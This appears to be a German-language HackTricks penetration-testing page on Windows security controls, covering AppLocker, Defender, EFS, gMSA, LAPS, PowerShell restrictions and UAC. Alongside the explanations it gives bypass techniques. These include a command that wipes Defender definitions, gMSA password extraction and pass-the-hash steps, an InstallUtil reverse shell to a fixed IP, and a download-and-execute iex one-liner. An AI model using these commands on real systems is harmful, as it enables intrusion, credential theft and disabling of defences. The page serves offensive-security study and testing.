# Windows-Sicherheitskontrollen

{{#include ../../banners/hacktricks-training.md}}

## AppLocker-Richtlinie

Eine Anwendungs-Whitelist ist eine Liste genehmigter Softwareanwendungen oder ausführbarer Dateien, die auf einem System vorhanden sein dürfen und ausgeführt werden können. Ziel ist es, die Umgebung vor schädlicher Malware und nicht genehmigter Software zu schützen, die nicht den spezifischen geschäftlichen Anforderungen einer Organisation entspricht.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ist Microsofts **Lösung für Application Whitelisting** und gibt Systemadministratoren Kontrolle darüber, **welche Anwendungen und Dateien Benutzer ausführen können**. Es bietet **feingranulare Kontrolle** über ausführbare Dateien, Skripte, Windows-Installer-Dateien, DLLs, verpackte Apps und App-Installer.\
Es ist üblich, dass Organisationen **cmd.exe und PowerShell.exe blockieren** und Schreibzugriff auf bestimmte Verzeichnisse einschränken, **aber all das kann umgangen werden**.

### Prüfen

Prüfe, welche Dateien/Erweiterungen auf der Blacklist/Whitelist stehen:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Dieser Registry-Pfad enthält die von AppLocker angewendeten Konfigurationen und Richtlinien und ermöglicht so die Überprüfung der aktuell auf dem System durchgesetzten Regeln:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Nützliche **Writable folders** to bypass AppLocker Policy: Wenn AppLocker die Ausführung von Dateien innerhalb von `C:\Windows\System32` oder `C:\Windows` erlaubt, gibt es **writable folders**, die du verwenden kannst, um **bypass this**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Häufig als **vertrauenswürdig** angesehene [**"LOLBAS's"**] Binaries können ebenfalls nützlich sein, um AppLocker zu umgehen.
- **Schlecht geschriebene Regeln können ebenfalls umgangen werden**
- Zum Beispiel bei **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, kann man überall einen **Ordner namens `allowed`** erstellen und er wird erlaubt.
- Organisationen konzentrieren sich oft darauf, die ausführbare Datei **`%System32%\WindowsPowerShell\v1.0\powershell.exe`** zu blockieren, vergessen jedoch die **anderen** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) wie `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` oder `PowerShell_ISE.exe`.
- **DLL enforcement** ist aufgrund der zusätzlichen Last, die es auf ein System bringen kann, und des notwendigen Testaufwands sehr selten aktiviert. Daher hilft die Nutzung von **DLLs as backdoors**, AppLocker zu umgehen.
- Du kannst [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) oder [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) verwenden, um **Powershell**-Code in jedem Prozess auszuführen und AppLocker zu umgehen. Für mehr Infos siehe: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Speicherung von Anmeldeinformationen

### Security Accounts Manager (SAM)

Lokale Anmeldeinformationen befinden sich in dieser Datei, die Passwörter sind gehasht.

### Local Security Authority (LSA) - LSASS

Die **Anmeldeinformationen** (gehasht) werden im **Speicher** dieses Subsystems aus Gründen des Single Sign-On gespeichert.\
**LSA** verwaltet die lokale **Sicherheitsrichtlinie** (Passwortrichtlinie, Benutzerrechte...), **Authentifizierung**, **access tokens**...\
Die LSA ist die Komponente, die die bereitgestellten Anmeldeinformationen in der **SAM**-Datei (bei einer lokalen Anmeldung) **prüft** und mit dem **domain controller** kommuniziert, um einen Domänenbenutzer zu authentifizieren.

Die **Anmeldeinformationen** werden im **Prozess LSASS** gespeichert: Kerberos-Tickets, NT- und LM-Hashes, leicht entschlüsselbare Passwörter.

### LSA secrets

LSA kann einige Anmeldeinformationen auf der Festplatte speichern:

- Passwort des Computerkontos im Active Directory (domain controller nicht erreichbar).
- Passwörter der Konten von Windows-Diensten
- Passwörter für geplante Aufgaben
- Mehr (Passwort von IIS-Anwendungen...)

### NTDS.dit

Es ist die Datenbank des Active Directory. Sie ist nur auf Domain Controllern vorhanden.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) ist ein Antivirus, der in Windows 10 und Windows 11 sowie in Versionen von Windows Server verfügbar ist. Er **blockiert** gängige pentesting-Tools wie **`WinPEAS`**. Es gibt jedoch Wege, diese Schutzmaßnahmen zu **umgehen**.

### Check

Um den **Status** von **Defender** zu überprüfen, kannst du das PS-Cmdlet **`Get-MpComputerStatus`** ausführen (prüfe den Wert von **`RealTimeProtectionEnabled`**, um zu wissen, ob es aktiv ist):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Um es zu enumerieren, könntest du auch ausführen:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS sichert Dateien durch Verschlüsselung und verwendet einen **symmetrischen Schlüssel**, bekannt als **File Encryption Key (FEK)**. Dieser Schlüssel wird mit dem **öffentlichen Schlüssel** des Benutzers verschlüsselt und im $EFS **alternative data stream** der verschlüsselten Datei gespeichert. Wenn eine Entschlüsselung erforderlich ist, wird der entsprechende **private Schlüssel** des digitalen Zertifikats des Benutzers verwendet, um den FEK aus dem $EFS-Stream zu entschlüsseln. Mehr Details sind [hier](https://en.wikipedia.org/wiki/Encrypting_File_System) zu finden.

**Entschlüsselungsszenarien ohne Benutzereingriff** umfassen:

- Wenn Dateien oder Ordner auf ein nicht-EFS-Dateisystem verschoben werden, wie [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), werden sie automatisch entschlüsselt.
- Verschlüsselte Dateien, die über das Netzwerk via SMB/CIFS übertragen werden, werden vor der Übertragung entschlüsselt.

Diese Verschlüsselungsmethode erlaubt dem Besitzer **transparenten Zugriff** auf verschlüsselte Dateien. Allerdings reicht es nicht aus, einfach das Passwort des Besitzers zu ändern und sich anzumelden, um die Dateien zu entschlüsseln.

**Wichtige Erkenntnisse**:

- EFS verwendet einen symmetrischen FEK, der mit dem öffentlichen Schlüssel des Benutzers verschlüsselt ist.
- Die Entschlüsselung verwendet den privaten Schlüssel des Benutzers, um auf den FEK zuzugreifen.
- Automatische Entschlüsselung tritt unter bestimmten Bedingungen auf, z. B. beim Kopieren auf FAT32 oder bei Netzwerkübertragung.
- Verschlüsselte Dateien sind für den Besitzer ohne zusätzliche Schritte zugänglich.

### Check EFS info

Prüfe, ob ein **Benutzer** diesen **Dienst** verwendet hat, indem du prüfst, ob folgender Pfad existiert: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Überprüfe, **wer** Zugriff auf die Datei hat, mit cipher /c \<file\>  
Du kannst auch `cipher /e` und `cipher /d` in einem Ordner verwenden, um alle Dateien zu **verschlüsseln** bzw. **entschlüsseln**.

### Decrypting EFS files

#### Being Authority System

Dieser Weg setzt voraus, dass der **Opferbenutzer** einen **Prozess** auf dem Host ausführt. Falls das der Fall ist, kannst du mit einer `meterpreter`-Session den Token des Benutzerprozesses impersonieren (`impersonate_token` von `incognito`). Oder du könntest einfach in den Prozess des Benutzers `migrate`.

#### Knowing the users password


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft hat **Group Managed Service Accounts (gMSA)** entwickelt, um die Verwaltung von Servicekonten in IT-Infrastrukturen zu vereinfachen. Im Gegensatz zu traditionellen Servicekonten, die häufig die Einstellung "**Password never expire**" aktiviert haben, bieten gMSAs eine sicherere und besser verwaltbare Lösung:

- **Automatic Password Management**: gMSAs verwenden ein komplexes, 240-stelliges Passwort, das automatisch gemäß den Richtlinien der Domain oder des Computers geändert wird. Dieser Prozess wird vom Key Distribution Service (KDC) von Microsoft gehandhabt, wodurch manuelle Passwortaktualisierungen entfallen.
- **Enhanced Security**: Diese Konten sind gegen Sperrungen immun und können nicht für interaktive Logins verwendet werden, was ihre Sicherheit erhöht.
- **Multiple Host Support**: gMSAs können über mehrere Hosts geteilt werden, wodurch sie ideal für Dienste sind, die auf mehreren Servern laufen.
- **Scheduled Task Capability**: Im Gegensatz zu managed service accounts unterstützen gMSAs das Ausführen geplanter Aufgaben.
- **Simplified SPN Management**: Das System aktualisiert automatisch den Service Principal Name (SPN), wenn sich die sAMaccount-Details des Computers oder dessen DNS-Name ändern, was die SPN-Verwaltung vereinfacht.

Die Passwörter für gMSAs werden in der LDAP-Eigenschaft _**msDS-ManagedPassword**_ gespeichert und von Domain Controllers (DCs) alle 30 Tage automatisch zurückgesetzt. Dieses Passwort, ein verschlüsselter Datenblob bekannt als [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kann nur von autorisierten Administratoren und den Servern, auf denen die gMSAs installiert sind, abgerufen werden, was eine sichere Umgebung gewährleistet. Um auf diese Informationen zuzugreifen, ist eine gesicherte Verbindung wie LDAPS erforderlich, oder die Verbindung muss mit 'Sealing & Secure' authentifiziert sein.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Du kannst dieses Passwort mit [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader) auslesen:
```
/GMSAPasswordReader --AccountName jkohler
```
[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Sieh dir außerdem diese [web page](https://cube0x0.github.io/Relaying-for-gMSA/) an, um zu erfahren, wie man eine **NTLM relay attack** durchführt, um das **password** von **gMSA** zu **read**.

### Ausnutzen von ACL-Chaining, um das verwaltete gMSA-Passwort zu lesen (GenericAll -> ReadGMSAPassword)

In vielen Umgebungen können Benutzer mit geringen Rechten zu gMSA-Geheimnissen pivotieren, ohne den DC zu kompromittieren, indem sie fehlkonfigurierte Objekt-ACLs ausnutzen:

- Eine Gruppe, die du kontrollieren kannst (z. B. via GenericAll/GenericWrite), erhält `ReadGMSAPassword` für ein gMSA.
- Wenn du dich dieser Gruppe hinzufügst, erbst du das Recht, das `msDS-ManagedPassword`-Blob des gMSA über LDAP zu lesen und daraus verwendbare NTLM-Credentials abzuleiten.

Typischer Ablauf:

1) Finde den Pfad mit BloodHound und markiere deine Foothold-Principals als Owned. Suche nach Kanten wie:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Füge dich der zwischengeschalteten Gruppe hinzu, die du kontrollierst (Beispiel mit bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Das gMSA verwaltete Passwort über LDAP auslesen und den NTLM-Hash ableiten. NetExec automatisiert die Extraktion von `msDS-ManagedPassword` und die Konvertierung zu NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Authentifiziere dich als gMSA mit dem NTLM hash (kein Klartext erforderlich). Wenn das Konto in Remote Management Users ist, funktioniert WinRM direkt:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Hinweise:
- LDAP-Abfragen des `msDS-ManagedPassword` erfordern Sealing (z. B. LDAPS/sign+seal). Tools erledigen das automatisch.
- gMSAs erhalten oft lokale Rechte wie WinRM; überprüfe die Gruppenmitgliedschaft (z. B. Remote Management Users), um laterale Bewegung zu planen.
- Wenn du nur das Blob brauchst, um das NTLM selbst zu berechnen, siehe die MSDS-MANAGEDPASSWORD_BLOB-Struktur.



## LAPS

Die **Local Administrator Password Solution (LAPS)**, zum Download verfügbar bei [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), ermöglicht die Verwaltung von lokalen Administratorpasswörtern. Diese Passwörter, die **zufällig generiert**, einzigartig und **regelmäßig geändert** werden, werden zentral im Active Directory gespeichert. Der Zugriff auf diese Passwörter wird per ACLs auf autorisierte Benutzer beschränkt. Mit ausreichenden Berechtigungen ist es möglich, lokale Admin-Passwörter auszulesen.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **schränkt viele der Funktionen ein**, die nötig sind, um PowerShell effektiv zu nutzen, wie zum Beispiel das Blockieren von COM-Objekten, das Zulassen nur genehmigter .NET-Typen, XAML-basierter Workflows, PowerShell-Klassen und mehr.

### **Überprüfen**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Unter aktuellen Windows funktioniert dieser Bypass nicht, aber du kannst [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Zum Kompilieren musst du möglicherweise** _**Add a Reference**_ -> _Browse_ -> _Browse_ -> füge `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` hinzu und **ändere das Projekt auf .Net4.5**.

#### Direkter Bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Du kannst [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) oder [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) verwenden, um **Powershell-Code** in jedem Prozess auszuführen und den constrained mode zu umgehen. Für mehr Infos siehe: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## PS-Ausführungsrichtlinie

Standardmäßig ist sie auf **restricted.** Hauptwege, diese Richtlinie zu umgehen:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Mehr Informationen finden Sie [hier](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

Ist die API, die zur Authentifizierung von Benutzern verwendet werden kann.

Das SSPI ist dafür zuständig, das geeignete Protokoll für zwei Maschinen zu finden, die miteinander kommunizieren wollen. Die bevorzugte Methode dafür ist Kerberos. Anschließend verhandelt das SSPI, welches Authentifizierungsprotokoll verwendet wird. Diese Authentifizierungsprotokolle werden Security Support Provider (SSP) genannt, liegen auf jedem Windows-System in Form einer DLL vor und beide Maschinen müssen dasselbe unterstützen, um miteinander kommunizieren zu können.

### Main SSPs

- **Kerberos**: Die bevorzugte
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2**: Aus Kompatibilitätsgründen
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers und LDAP, Passwort in Form eines MD5-Hashes
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL und TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Wird verwendet, um das zu verwendende Protokoll auszuhandeln (Kerberos oder NTLM, wobei Kerberos die Standardwahl ist)
- %windir%\Windows\System32\lsasrv.dll

#### The negotiation could offer several methods or only one.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsaufforderung für Aktionen mit erhöhten Rechten** bereitstellt.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## Referenzen

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
